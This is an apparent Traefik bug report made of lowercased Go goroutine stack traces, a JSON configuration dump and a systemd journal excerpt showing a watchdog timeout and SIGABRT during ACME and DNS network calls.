net.(*resolver).lookupipaddr( , , , , , , , , , ) /usr/local/go/src/net/lookup.go:212 +
net.(*resolver).internetaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/ipsock.go:293 +
net.(*resolver).resolveaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:193 +
net.(*dialer).dialcontext( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:375 +
net.(*dialer).dial( , , , , , , , , ) /usr/local/go/src/net/dial.go:320 +
net.(*dialer).dial-fm( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:25 +
net/http.(*transport).dial( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:901 +
net/http.(*transport).dialconn( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:1143 +
net/http.(*transport).getconn.func4( , , , , ) /usr/local/go/src/net/http/transport.go:957 +
created by net/http.(*transport).getconn /usr/local/go/src/net/http/transport.go:956 + goroutine 1822 [chan receive]:
net/http.(*transport).getconn.func2.1( , , ) /usr/local/go/src/net/http/transport.go:946 +
created by net/http.(*transport).getconn.func2 /usr/local/go/src/net/http/transport.go:945 + goroutine 1824 [runnable]:
net.uitoa( , , ) /usr/local/go/src/net/parse.go:204 +
net.ip.string( , , , , ) /usr/local/go/src/net/ip.go:278 +
net.ipemptystring( , , , , ) /usr/local/go/src/net/ip.go:340 +
net.(*tcpaddr).string( , , ) /usr/local/go/src/net/tcpsock.go:32 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1720 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2795 + goroutine 1792 [chan receive]:
net/http.(*transport).getconn.func2.1( , , ) /usr/local/go/src/net/http/transport.go:946 +
created by net/http.(*transport).getconn.func2 /usr/local/go/src/net/http/transport.go:945 + goroutine 1829 [select]:
net.(*resolver).lookupipaddr( , , , , , , , , , ) /usr/local/go/src/net/lookup.go:212 +
net.(*resolver).internetaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/ipsock.go:293 +
net.(*resolver).resolveaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:193 +
net.(*dialer).dialcontext( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:375 +
net.(*dialer).dial( , , , , , , , , ) /usr/local/go/src/net/dial.go:320 +
net.(*dialer).dial-fm( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:25 +
net/http.(*transport).dial( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:901 +
net/http.(*transport).dialconn( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:1143 +
net/http.(*transport).getconn.func4( , , , , ) /usr/local/go/src/net/http/transport.go:957 +
created by net/http.(*transport).getconn /usr/local/go/src/net/http/transport.go:956 + goroutine 1830 [select]:
net.(*resolver).lookupipaddr( , , , , , , , , , ) /usr/local/go/src/net/lookup.go:212 +
net.(*resolver).internetaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/ipsock.go:293 +
net.(*resolver).resolveaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:193 +
net.(*dialer).dialcontext( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:375 +
net.(*dialer).dial( , , , , , , , , ) /usr/local/go/src/net/dial.go:320 +
net.(*dialer).dial-fm( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:25 +
net/http.(*transport).dial( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:901 +
net/http.(*transport).dialconn( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:1143 +
net/http.(*transport).getconn.func4( , , , , ) /usr/local/go/src/net/http/transport.go:957 +
created by net/http.(*transport).getconn /usr/local/go/src/net/http/transport.go:956 + goroutine 1763 [chan receive]:
net.(*resolver).golookupipcnameorder( , , , , , , , , , , ...) /usr/local/go/src/net/dnsclient_unix.go:491 +
net.(*resolver).lookupip( , , , , , , , , , ) /usr/local/go/src/net/lookup_unix.go:101 +
net.(*resolver).(net.lookupip)-fm( , , , , , , , , ) /usr/local/go/src/net/lookup.go:192 +
net.glob..func10( , , , , , , , , , ) /usr/local/go/src/net/hook.go:19 +
net.(*resolver).lookupipaddr.func1( , , , ) /usr/local/go/src/net/lookup.go:206 +
internal/singleflight.(*group).docall( , , , , ) /usr/local/go/src/internal/singleflight/singleflight.go:95 +
created by internal/singleflight.(*group).dochan /usr/local/go/src/internal/singleflight/singleflight.go:88 + goroutine 1794 [runnable]:
net/http.(*transport).getconn( , , , , , , , , , ) /usr/local/go/src/net/http/transport.go:962 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:409 +
net/http.send( , , , , , , , , , ) /usr/local/go/src/net/http/client.go:252 +
net/http.(*client).send( , , , , , , , , ) /usr/local/go/src/net/http/client.go:176 +
net/http.(*client).do( , , , , ) /usr/local/go/src/net/http/client.go:615 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.httpget( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:81 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.getjson( , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:87 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).getauthzfororder.func1( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:584 +
created by github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).getauthzfororder /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:582 + goroutine 1819 [select]:
net.(*resolver).lookupipaddr( , , , , , , , , , ) /usr/local/go/src/net/lookup.go:212 +
net.(*resolver).internetaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/ipsock.go:293 +
net.(*resolver).resolveaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:193 +
net.(*dialer).dialcontext( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:375 +
net.(*dialer).dial( , , , , , , , , ) /usr/local/go/src/net/dial.go:320 +
net.(*dialer).dial-fm( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:25 +
net/http.(*transport).dial( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:901 +
net/http.(*transport).dialconn( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:1143 +
net/http.(*transport).getconn.func4( , , , , ) /usr/local/go/src/net/http/transport.go:957 +
created by net/http.(*transport).getconn /usr/local/go/src/net/http/transport.go:956 + goroutine 1834 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
crypto/tls.(*block).readfromuntil( , , , , , ) /usr/local/go/src/crypto/tls/conn.go:493 +
crypto/tls.(*conn).readrecord( , , , ) /usr/local/go/src/crypto/tls/conn.go:595 +
crypto/tls.(*conn).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1156 +
net/http.(*connreader).backgroundread( ) /usr/local/go/src/net/http/server.go:668 +
created by net/http.(*connreader).startbackgroundread /usr/local/go/src/net/http/server.go:664 + goroutine 1799 [chan receive]:
net/http.(*transport).getconn.func2.1( , , ) /usr/local/go/src/net/http/transport.go:946 +
created by net/http.(*transport).getconn.func2 /usr/local/go/src/net/http/transport.go:945 + goroutine 1823 [select]:
net.(*resolver).lookupipaddr( , , , , , , , , , ) /usr/local/go/src/net/lookup.go:212 +
net.(*resolver).internetaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/ipsock.go:293 +
net.(*resolver).resolveaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:193 +
net.(*dialer).dialcontext( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:375 +
net.(*dialer).dial( , , , , , , , , ) /usr/local/go/src/net/dial.go:320 +
net.(*dialer).dial-fm( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:25 +
net/http.(*transport).dial( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:901 +
net/http.(*transport).dialconn( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:1143 +
net/http.(*transport).getconn.func4( , , , , ) /usr/local/go/src/net/http/transport.go:957 +
created by net/http.(*transport).getconn /usr/local/go/src/net/http/transport.go:956 + goroutine 1801 [runnable]:
context.withdeadline( , , , , , , , ) /usr/local/go/src/context/context.go:390 +
net.(*resolver).exchange( , , , , , , , , , , ...) /usr/local/go/src/net/dnsclient_unix.go:126 +
net.(*resolver).tryonename( , , , , , , , , , , ...) /usr/local/go/src/net/dnsclient_unix.go:161 +
net.(*resolver).golookupipcnameorder.func1( , , , , , , ) /usr/local/go/src/net/dnsclient_unix.go:485 +
created by net.(*resolver).golookupipcnameorder /usr/local/go/src/net/dnsclient_unix.go:483 + goroutine 1790 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 1800 [runnable]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net.(*dnspacketconn).dnsroundtrip( , , , , ) /usr/local/go/src/net/dnsclient_unix.go:57 +
net.(*resolver).exchange( , , , , , , , , , , ...) /usr/local/go/src/net/dnsclient_unix.go:138 +
net.(*resolver).tryonename( , , , , , , , , , , ...) /usr/local/go/src/net/dnsclient_unix.go:161 +
net.(*resolver).golookupipcnameorder.func1( , , , , , , ) /usr/local/go/src/net/dnsclient_unix.go:485 +
created by net.(*resolver).golookupipcnameorder /usr/local/go/src/net/dnsclient_unix.go:483 + goroutine 1796 [select]:
net/http/httputil.(*reverseproxy).servehttp.func1( , , , ) /usr/local/go/src/net/http/httputil/reverseproxy.go:154 +
created by net/http/httputil.(*reverseproxy).servehttp /usr/local/go/src/net/http/httputil/reverseproxy.go:153 + goroutine 1748 [runnable]:
reflect.(*rtype).nameoff( , , ) /usr/local/go/src/reflect/type.go:685 +
reflect.(*rtype).exportedmethods( , , , ) /usr/local/go/src/reflect/type.go:801 +
reflect.(*rtype).nummethod( , ) /usr/local/go/src/reflect/type.go:833 +
encoding/json.(*decodestate).indirect( , , , , , , , , , , ...) /usr/local/go/src/encoding/json/decode.go:489 +
encoding/json.(*decodestate).literalstore( , , , , , , , ) /usr/local/go/src/encoding/json/decode.go:873 +
encoding/json.(*decodestate).literal( , , , ) /usr/local/go/src/encoding/json/decode.go:842 +
encoding/json.(*decodestate).value( , , , ) /usr/local/go/src/encoding/json/decode.go:411 +
encoding/json.(*decodestate).object( , , , ) /usr/local/go/src/encoding/json/decode.go:776 +
encoding/json.(*decodestate).value( , , , ) /usr/local/go/src/encoding/json/decode.go:408 +
encoding/json.(*decodestate).unmarshal( , , , , ) /usr/local/go/src/encoding/json/decode.go:189 +
encoding/json.(*decoder).decode( , , , , ) /usr/local/go/src/encoding/json/stream.go:73 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.getjson( , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:97 +
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).getauthzfororder.func1( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:584 +
created by github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).getauthzfororder /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:582 + goroutine 1764 [select]:
net/http.(*http2serverconn).writedatafromhandler( , , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:4651 +
net/http.(*http2responsewriterstate).writechunk( , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:6065 +
net/http.http2chunkwriter.write( , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:5973 +
bufio.(*writer).write( , , , , , , ) /usr/local/go/src/bufio/bufio.go:605 +
net/http.(*http2responsewriter).write( , , , , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:6270 +
net/http.(*http2responsewriter).write( , , , , , , ) /usr/local/go/src/net/http/h2_bundle.go:6244 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(*responsewriter).write( , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/response_writer.go:61 +
github.com/containous/traefik/vendor/github.com/thoas/stats.(*recorderresponsewriter).write( , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/recorder.go:58 +
github.com/containous/traefik/vendor/github.com/nytimes/gziphandler.(*gzipresponsewriter).close( , , ) /go/src/github.com/containous/traefik/vendor/github.com/nytimes/gziphandler/gzip.go:184 +
github.com/containous/traefik/vendor/github.com/nytimes/gziphandler.gziphandlerwithopts.func1.1( , , ) /go/src/github.com/containous/traefik/vendor/github.com/nytimes/gziphandler/gzip.go:294 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1947 +
github.com/containous/traefik/middlewares.(*compress).servehttp( , , , , ) /go/src/github.com/containous/traefik/middlewares/compress.go:21 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/thoas/stats.(*stats).servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:64 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1947 +
github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , ) /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
net/http.serverhandler.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2694 +
net/http.initnpnrequest.servehttp( , , , , ) /usr/local/go/src/net/http/server.go:3260 +
net/http.(handler).servehttp-fm( , , ) /usr/local/go/src/net/http/h2_bundle.go:5475 +
net/http.(*http2serverconn).runhandler( , , , ) /usr/local/go/src/net/http/h2_bundle.go:5760 +
created by net/http.(*http2serverconn).processheaders /usr/local/go/src/net/http/h2_bundle.go:5494 + goroutine 1812 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 1749 [select]:
net.(*resolver).lookupipaddr( , , , , , , , , , ) /usr/local/go/src/net/lookup.go:212 +
net.(*resolver).internetaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/ipsock.go:293 +
net.(*resolver).resolveaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:193 +
net.(*dialer).dialcontext( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:375 +
net.(*dialer).dial( , , , , , , , , ) /usr/local/go/src/net/dial.go:320 +
net.(*dialer).dial-fm( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:25 +
net/http.(*transport).dial( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:901 +
net/http.(*transport).dialconn( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:1143 +
net/http.(*transport).getconn.func4( , , , , ) /usr/local/go/src/net/http/transport.go:957 +
created by net/http.(*transport).getconn /usr/local/go/src/net/http/transport.go:956 + goroutine 1750 [select]:
net/http/httputil.(*reverseproxy).servehttp.func1( , , , ) /usr/local/go/src/net/http/httputil/reverseproxy.go:154 +
created by net/http/httputil.(*reverseproxy).servehttp /usr/local/go/src/net/http/httputil/reverseproxy.go:153 + goroutine 1751 [select]:
net.(*resolver).lookupipaddr( , , , , , , , , , ) /usr/local/go/src/net/lookup.go:212 +
net.(*resolver).internetaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/ipsock.go:293 +
net.(*resolver).resolveaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:193 +
net.(*dialer).dialcontext( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:375 +
net.(*dialer).dial( , , , , , , , , ) /usr/local/go/src/net/dial.go:320 +
net.(*dialer).dial-fm( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:25 +
net/http.(*transport).dial( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:901 +
net/http.(*transport).dialconn( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:1143 +
net/http.(*transport).getconn.func4( , , , , ) /usr/local/go/src/net/http/transport.go:957 +
created by net/http.(*transport).getconn /usr/local/go/src/net/http/transport.go:956 +
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "tracing": null, "loglevel": "", "entrypoints": {}, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": false, "web": null, "docker": null, "file": null, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": null, "metrics": null, "ping": null, "configfile": ""
``` ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) <details>
<summary>log</summary> ```shell
jun 29 15:17:29 [localhost] systemd: traefik.service watchdog timeout (limit 1s)!
jun 29 15:17:29 [localhost] traefik: sigabrt: abort
jun 29 15:17:29 [localhost] traefik: pc= m=0 sigcode=0
jun 29 15:17:29 [localhost] traefik: goroutine 0 [idle]:
jun 29 15:17:29 [localhost] traefik: runtime.futex( , , , , , , , , , , ...)
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/sys_linux_amd64.s:530 +
jun 29 15:17:29 [localhost] traefik: runtime.futexsleep( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/os_linux.go:45 +
jun 29 15:17:29 [localhost] traefik: runtime.notesleep( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/lock_futex.go:151 +
jun 29 15:17:29 [localhost] traefik: runtime.stopm()
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/proc.go:1952 +
jun 29 15:17:29 [localhost] traefik: runtime.exitsyscall0( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/proc.go:3129 +
jun 29 15:17:29 [localhost] traefik: runtime.mcall( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/asm_amd64.s:351 +
jun 29 15:17:29 [localhost] traefik: goroutine 1 [chan receive, 1756 minutes]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/server.(*server).wait(...)
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:232
jun 29 15:17:29 [localhost] traefik: main.runcmd( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:216 +
jun 29 15:17:29 [localhost] traefik: main.main.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:54 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/staert.(*staert).run( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/staert.go:84 +
jun 29 15:17:29 [localhost] traefik: main.main()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:142 +
jun 29 15:17:29 [localhost] traefik: goroutine 8 [select, 1756 minutes]:
jun 29 15:17:29 [localhost] traefik: io.(*pipe).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/io/pipe.go:50 +
jun 29 15:17:29 [localhost] traefik: io.(*pipereader).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/io/pipe.go:127 +
jun 29 15:17:29 [localhost] traefik: bufio.(*scanner).scan( , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/scan.go:208 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/sirupsen/logrus.(*entry).writerscanner( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/sirupsen/logrus/writer.go:51 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/vendor/github.com/sirupsen/logrus.(*entry).writerlevel
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/sirupsen/logrus/writer.go:43 +
jun 29 15:17:29 [localhost] traefik: goroutine 21 [chan receive]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/golang/glog.(*loggingt).flushdaemon( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/golang/glog/glog.go:879 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/vendor/github.com/golang/glog.init.0
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/golang/glog/glog.go:410 +
jun 29 15:17:29 [localhost] traefik: goroutine 22 [syscall, 1756 minutes]:
jun 29 15:17:29 [localhost] traefik: os/signal.signal_recv( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/sigqueue.go:139 +
jun 29 15:17:29 [localhost] traefik: os/signal.loop()
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/os/signal/signal_unix.go:22 +
jun 29 15:17:29 [localhost] traefik: created by os/signal.init.0
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/os/signal/signal_unix.go:28 +
jun 29 15:17:29 [localhost] traefik: goroutine 11 [chan receive, 316 minutes]:
jun 29 15:17:29 [localhost] traefik: main.checknewversion.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:283 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/safe.gowithrecover
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
jun 29 15:17:29 [localhost] traefik: goroutine 9 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 10 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 12 [select, 1756 minutes, locked to thread]:
jun 29 15:17:29 [localhost] traefik: runtime.gopark( , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/proc.go:291 +
jun 29 15:17:29 [localhost] traefik: runtime.selectgo( , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/select.go:392 +
jun 29 15:17:29 [localhost] traefik: runtime.ensuresigm.func1()
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/signal_unix.go:549 +
jun 29 15:17:29 [localhost] traefik: runtime.goexit()
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/asm_amd64.s:2361 +
jun 29 15:17:29 [localhost] traefik: goroutine 13 [chan receive, 1756 minutes]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/cmd.contextwithsignal.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/cmd/context.go:17 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/cmd.contextwithsignal
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/cmd/context.go:15 +
jun 29 15:17:29 [localhost] traefik: goroutine 14 [chan receive, 1756 minutes]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/server.(*server).startwithcontext.func1( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:214 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/server.(*server).startwithcontext
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:212 +
jun 29 15:17:29 [localhost] traefik: goroutine 15 [sleep]:
jun 29 15:17:29 [localhost] traefik: time.sleep( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/time.go:102 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/thoas/stats.new.func1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:35 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/vendor/github.com/thoas/stats.new
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:31 +
jun 29 15:17:29 [localhost] traefik: goroutine 16 [runnable]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
